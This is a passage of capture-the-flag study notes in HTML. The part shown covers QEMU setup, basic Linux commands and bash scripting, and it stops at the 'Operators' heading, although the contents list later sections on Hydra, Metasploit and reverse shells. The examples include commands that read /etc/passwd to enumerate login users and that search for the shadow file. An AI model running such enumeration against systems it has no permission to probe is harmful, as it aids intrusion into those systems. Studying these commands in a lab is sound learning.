<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <meta name="author" content="Daniel Hiller" />
  <title>CTF</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<header id="title-block-header">
<h1 class="title">CTF</h1>
<p class="author">Daniel Hiller</p>
</header>
<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#ctf"><span class="toc-section-number">1</span> CTF</a>
<ul>
<li><a href="#introduction"><span class="toc-section-number">1.1</span> Introduction</a>
<ul>
<li><a href="#contributing"><span class="toc-section-number">1.1.1</span> Contributing</a></li>
<li><a href="#license"><span class="toc-section-number">1.1.2</span> License</a></li>
</ul></li>
<li><a href="#vm"><span class="toc-section-number">1.2</span> VM</a>
<ul>
<li><a href="#qemu"><span class="toc-section-number">1.2.1</span> QEMU</a></li>
</ul></li>
<li><a href="#linux-basics"><span class="toc-section-number">1.3</span> Linux Basics</a>
<ul>
<li><a href="#basic-commands"><span class="toc-section-number">1.3.1</span> Basic Commands</a></li>
<li><a href="#find"><span class="toc-section-number">1.3.2</span> FIND</a></li>
<li><a href="#filter-content"><span class="toc-section-number">1.3.3</span> Filter Content</a>
<ul>
<li><a href="#grep"><span class="toc-section-number">1.3.3.1</span> Grep</a></li>
<li><a href="#cut"><span class="toc-section-number">1.3.3.2</span> Cut</a></li>
</ul></li>
<li><a href="#locate"><span class="toc-section-number">1.3.4</span> Locate</a></li>
<li><a href="#file-descriptors"><span class="toc-section-number">1.3.5</span> File Descriptors</a></li>
</ul></li>
<li><a href="#bash-scripting"><span class="toc-section-number">1.4</span> Bash Scripting</a>
<ul>
<li><a href="#operators"><span class="toc-section-number">1.4.0.1</span> Operators</a></li>
<li><a href="#file-operators"><span class="toc-section-number">1.4.0.2</span> File Operators</a></li>
<li><a href="#arguments"><span class="toc-section-number">1.4.1</span> Arguments</a></li>
<li><a href="#special-variables"><span class="toc-section-number">1.4.2</span> Special Variables</a></li>
<li><a href="#variables"><span class="toc-section-number">1.4.3</span> Variables</a></li>
<li><a href="#arrays"><span class="toc-section-number">1.4.4</span> Arrays</a></li>
<li><a href="#arithmetic"><span class="toc-section-number">1.4.5</span> Arithmetic</a></li>
<li><a href="#input-control"><span class="toc-section-number">1.4.6</span> Input Control</a></li>
<li><a href="#output-control"><span class="toc-section-number">1.4.7</span> Output Control</a></li>
<li><a href="#loops"><span class="toc-section-number">1.4.8</span> Loops</a>
<ul>
<li><a href="#for-loops"><span class="toc-section-number">1.4.8.1</span> For Loops</a></li>
<li><a href="#while-loops"><span class="toc-section-number">1.4.8.2</span> While Loops</a></li>
<li><a href="#until-loops"><span class="toc-section-number">1.4.8.3</span> Until Loops</a></li>
</ul></li>
<li><a href="#switch-case"><span class="toc-section-number">1.4.9</span> Switch case</a></li>
<li><a href="#functions"><span class="toc-section-number">1.4.10</span> Functions</a>
<ul>
<li><a href="#parameter-passing"><span class="toc-section-number">1.4.10.1</span> Parameter Passing</a></li>
<li><a href="#return-values"><span class="toc-section-number">1.4.10.2</span> Return Values</a></li>
</ul></li>
<li><a href="#debugging"><span class="toc-section-number">1.4.11</span> Debugging</a></li>
<li><a href="#cheat-sheet"><span class="toc-section-number">1.4.12</span> Cheat Sheet</a>
<ul>
<li><a href="#dig"><span class="toc-section-number">1.4.12.1</span> DIG</a></li>
<li><a href="#project-sonar"><span class="toc-section-number">1.4.12.2</span> Project Sonar</a></li>
<li><a href="#certificates"><span class="toc-section-number">1.4.12.3</span> Certificates</a></li>
</ul></li>
<li><a href="#active-information-gathering"><span class="toc-section-number">1.4.13</span> Active Information Gathering</a>
<ul>
<li><a href="#http-header"><span class="toc-section-number">1.4.13.1</span> HTTP Header</a></li>
<li><a href="#whatweb"><span class="toc-section-number">1.4.13.2</span> WhatWeb</a></li>
</ul></li>
</ul></li>
<li><a href="#exploiting-network-services"><span class="toc-section-number">1.5</span> Exploiting Network Services</a>
<ul>
<li><a href="#github-repos"><span class="toc-section-number">1.5.1</span> GitHub Repos</a></li>
<li><a href="#ssh"><span class="toc-section-number">1.5.2</span> SSH</a></li>
<li><a href="#nmap"><span class="toc-section-number">1.5.3</span> NMAP</a></li>
<li><a href="#ftp"><span class="toc-section-number">1.5.4</span> FTP</a>
<ul>
<li><a href="#hydra"><span class="toc-section-number">1.5.4.1</span> Hydra</a></li>
</ul></li>
<li><a href="#nfs"><span class="toc-section-number">1.5.5</span> NFS</a></li>
<li><a href="#smtp"><span class="toc-section-number">1.5.6</span> SMTP</a></li>
<li><a href="#metasploit"><span class="toc-section-number">1.5.7</span> Metasploit</a></li>
<li><a href="#mysql"><span class="toc-section-number">1.5.8</span> MySQL</a></li>
<li><a href="#john-the-ripper"><span class="toc-section-number">1.5.9</span> John the Ripper</a></li>
</ul></li>
<li><a href="#web-fundamentals"><span class="toc-section-number">1.6</span> Web Fundamentals</a>
<ul>
<li><a href="#curl"><span class="toc-section-number">1.6.1</span> Curl</a></li>
<li><a href="#reverse-shell"><span class="toc-section-number">1.6.2</span> Reverse Shell</a></li>
</ul></li>
</ul></li>
</ul>
</nav>
<h1 data-number="1" id="ctf"><span class="header-section-number">1</span> CTF</h1>
<h2 data-number="1.1" id="introduction"><span class="header-section-number">1.1</span> Introduction</h2>
<h3 data-number="1.1.1" id="contributing"><span class="header-section-number">1.1.1</span> Contributing</h3>
<p><strong>Found an error or have a suggestion?</strong> Please open an issue on GitHub (<a href="https://github.com/dentremor/Software-Defined-Infrastrucure">github.com/dentremor/Software-Defined-Infrastrucure</a>):</p>
<figure>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXIAAAFyAQAAAADAX2ykAAACjklEQVR4nO2bTW6kQAyF3xtKyhKkHKCPUtxsNEeaG1BHyQEiUcuWQG8WNqEzk18NISC5FkjQ3+JJ7lfYLkPhM6v8+BQOBB988MEHH3zwr/H0lUB2AMkElA4A6vJbv6Oe4DfmsyRpBDRgJvIIID8kAGgkSXrOf7We4DfmqzuUfb0TyuVK9y8WO++rJ/iv4c2/qHdij5nfrif4jfksSUM7QUOrf4vjw+sP/kW+lTQA4JNr2S8XSdPeeoLfhvcXa7GYNgDqvZgf0oT8O03AX5v00fQH//ay+K77sErXQKgzgXYC0D7fo4+mP/iP8OxrAlBJZF2J0jWCW3cmUBPY76gn+C/gyYvkVVF79V25MN3eHll/8C8t615obIQ8NlqeTbD9OY8AgEaeWB9Nf/DvrLU5tVZFGiy0jYBWdrEV8T0Z7/4dAEgjAGCJapb71/4C4d8z8pY/M48diFYg2kcKmBNK9/iEzUuD8mj6g39nLf5tBLeu9zJ8uwaspxX+PSW/+NJcCwA1Qaj3E/NDMmMLeCqRj6Y/+E/wlXY0SHaAvYS9EvZO5cH1B/8qb6eCS648YKZ+dTOlcaYFfl89wW/De37lF0KFALLmxDzOgOdcAvfRE/y2/E1/w7oaefTUyupfuyzlb+RXZ+OX/kbr8zlYk+i8TuW0EyK+J+Y9tHagP9Nva1qCbOMc++kJflt+nZ+0hnNZB64syHG+f27+Zn7ypvV85dru2FdP8Bvzy/yknQ+WbqaGmoBC3kxSHld/8B/lq2/N5MXmN7Q+O4P+4N/i2bcSf2qC1UwDAJvp+B49wf8ff3v4Z0Xw6PWRn/nLTRz10Zn5QtI/Pbpc7dXL3lKr6D+fmWd83x188MEHH3zwu/N/AMqrho6Gg6voAAAAAElFTkSuQmCC" width="150" alt="QR code to source repository" /><figcaption aria-hidden="true">QR code to source repository</figcaption>
</figure>
<h3 data-number="1.1.2" id="license"><span class="header-section-number">1.1.2</span> License</h3>
<figure>
<img src="data:image/png;base64,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" width="128" alt="AGPL-3.0 license badge" /><figcaption aria-hidden="true">AGPL-3.0 license badge</figcaption>
</figure>
<p>Software Defined Infrastructure (c) 2021 Daniel Hiller and contributors</p>
<p>SPDX-License-Identifier: AGPL-3.0 </p>
<h2 data-number="1.2" id="vm"><span class="header-section-number">1.2</span> VM</h2>
<h3 data-number="1.2.1" id="qemu"><span class="header-section-number">1.2.1</span> QEMU</h3>
<p>To create a disk image run the following command:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-img</span> create <span class="at">-f</span> qcow2 disk.qcow2 64G</span></code></pre></div>
<p>The VM can be executed with a bash script (remove Image.iso with the distro image of your choice):</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-system-x86_64</span> <span class="at">-enable-kvm</span> <span class="at">-m</span> 4096 <span class="at">-smp</span> <span class="va">$(</span><span class="ex">nproc</span><span class="va">)</span> <span class="at">-cpu</span> host <span class="at">-device</span> ac97 <span class="at">-audiodev</span> alsa,id=snd0,out.buffer-length=500000,out.period-length=726 <span class="at">-display</span> default,show-cursor=on <span class="at">-usb</span> <span class="at">-device</span> usb-tablet <span class="at">-device</span> virtio-keyboard-pci <span class="at">-net</span> nic <span class="at">-net</span> user <span class="at">-cdrom</span> distro.iso <span class="at">-device</span> virtio-vga-gl <span class="at">-display</span> sdl,gl=on <span class="at">-hda</span> disk.qcow2 <span class="at">-bios</span> /usr/share/edk2/ovmf/OVMF_CODE.fd</span></code></pre></div>
<p>If you also have a 4k-panel, you probably will face some scaling issues like me. In that case make sure you use <code>Wayland</code> instead of <code>X11</code>.</p>
<h2 data-number="1.3" id="linux-basics"><span class="header-section-number">1.3</span> Linux Basics</h2>
<h3 data-number="1.3.1" id="basic-commands"><span class="header-section-number">1.3.1</span> Basic Commands</h3>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>whoami</code></td>
<td>Displays current username.</td>
</tr>
<tr class="even">
<td><code>wc</code></td>
<td>print newline, word, and byte counts for each file.</td>
</tr>
<tr class="odd">
<td><code>which</code></td>
<td>Locate a command.</td>
</tr>
<tr class="even">
<td><code>id</code></td>
<td>Returns users identity.</td>
</tr>
<tr class="odd">
<td><code>hostname</code></td>
<td>Sets or prints the name of current host system.</td>
</tr>
<tr class="even">
<td><code>uname</code></td>
<td>Prints basic information about the operating system name and system hardware.</td>
</tr>
<tr class="odd">
<td><code>pwd</code></td>
<td>Returns working directory name.</td>
</tr>
<tr class="even">
<td><code>ifconfig</code></td>
<td>The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters.</td>
</tr>
<tr class="odd">
<td><code>ip</code></td>
<td>Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels.</td>
</tr>
<tr class="even">
<td><code>netstat</code></td>
<td>Shows network status.</td>
</tr>
<tr class="odd">
<td><code>ss</code></td>
<td>Another utility to investigate sockets.</td>
</tr>
<tr class="even">
<td><code>ps</code></td>
<td>Shows process status.</td>
</tr>
<tr class="odd">
<td><code>who</code></td>
<td>Displays who are logged in.</td>
</tr>
<tr class="even">
<td><code>env</code></td>
<td>Prints environment or sets and executes command.</td>
</tr>
<tr class="odd">
<td><code>lsblk</code></td>
<td>Lists block devices.</td>
</tr>
<tr class="even">
<td><code>lsusb</code></td>
<td>Lists USB devices.</td>
</tr>
<tr class="odd">
<td><code>lsof</code></td>
<td>Lists opened files.</td>
</tr>
<tr class="even">
<td><code>lspci</code></td>
<td>Lists PCI devices.</td>
</tr>
</tbody>
</table>
<h3 data-number="1.3.2" id="find"><span class="header-section-number">1.3.2</span> FIND</h3>
<p><code>find</code> search for files in a directory hierarchy:</p>
<pre class="shell"><code>$ find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2&gt;/dev/null</code></pre>
<pre><code>*(-type f               = defined the type of the searched object
  -name *.conf          = indicates the name of the object we are looking for
  -user root            = filters all files from a specific user
  -size +20k            = show only files which are larger than 20KiB
  -newermt 2020-03-03   = show only files newer than the specified date
  -exec ls -al {} \;    = this option executes the specified command
  -2&gt;/dev/null          = this redirection ensures that no errors are displayed in the terminal)</code></pre>
<h3 data-number="1.3.3" id="filter-content"><span class="header-section-number">1.3.3</span> Filter Content</h3>
<p><code>less</code> is file pager.</p>
<p><code>sort</code> sort lines of text files.</p>
<p><code>tr</code> translate or delete characters.</p>
<p><code>column</code> columnate lists - to display results in tabular form use the flag <code>-t</code>.</p>
<p><code>wc</code> print newline, word, and byte counts for each file - <code>-l</code> prints line counter</p>
<h4 data-number="1.3.3.1" id="grep"><span class="header-section-number">1.3.3.1</span> Grep</h4>
<p><code>grep</code> print lines matching a pattern. If we want to exclude a result we must use the <code>-v</code> flag.</p>
<h4 data-number="1.3.3.2" id="cut"><span class="header-section-number">1.3.3.2</span> Cut</h4>
<p><code>cut</code> remove sections from each line of files.</p>
<pre class="shell"><code>$ cat /etc/passwd | grep -v &quot;false\|nologin&quot; | cut -d&quot;:&quot; -f1</code></pre>
<pre><code>*(-d &quot;:&quot;     = Sets a delimiter at the character `:`
  -f1        = Selects only this field in our case the first one)</code></pre>
<h3 data-number="1.3.4" id="locate"><span class="header-section-number">1.3.4</span> Locate</h3>
<p><code>locate</code> - find files by name</p>
<p>Update the database for <code>locate</code>:</p>
<pre class="shell"><code>$ sudo updatedb</code></pre>
<p>Search for all files that end with <code>.conf</code></p>
<pre class="shell"><code>$ locate *.conf</code></pre>
<h3 data-number="1.3.5" id="file-descriptors"><span class="header-section-number">1.3.5</span> File Descriptors</h3>
<ol type="1">
<li>Data Stream for Input</li>
</ol>
<ul>
<li>STDIN - 0</li>
</ul>
<ol start="2" type="1">
<li>Data Stream for Output</li>
</ol>
<ul>
<li>STDOUT - 1</li>
</ul>
<ol start="3" type="1">
<li>Data Stream for Output that relates to an error occurring.</li>
</ol>
<ul>
<li>STDERR – 2</li>
</ul>
<p>If we want to discard for example all errors and redirect the data into a file we can use:</p>
<pre class="shell"><code>$ find /etc/ -name shadow 2&gt; stderr.txt 1&gt; stdout.txt</code></pre>
<h2 data-number="1.4" id="bash-scripting"><span class="header-section-number">1.4</span> Bash Scripting</h2>
<p>If we want to execute a bash script we can do this by the following command:</p>
<pre class="shell"><code>$ &lt;interpreter&gt; script.sh &lt;optional arguments&gt;</code></pre>
<p>Run a bash script with persistent permissions (<code>-p</code>):</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./bashscript <span class="at">-p</span></span></code></pre></div>
<p>In the first line we can specify the interpreter but if we call the script with another one, the defined in the <code>shebang</code> will be ignored:</p>
<pre class="shell"><code>#!/bin/bash</code></pre>
<p>This is also possible with other scripting languages like Python <code>#!/usr/bin/env python</code>. ### Conditional Execution</p>
<p>The rough basic structure is as follows:</p>
<pre class="shell"><code>if [[ -z &quot;$string&quot; ]]; then
  echo &quot;String is empty&quot;
elif [[ -n &quot;$string&quot; ]]; then
  echo &quot;String is not empty&quot;
fi</code></pre>
<h4 data-number="1.4.0.1" id="operators"><span class="header-section-number">1.4.0.1</span> Operators</h4>
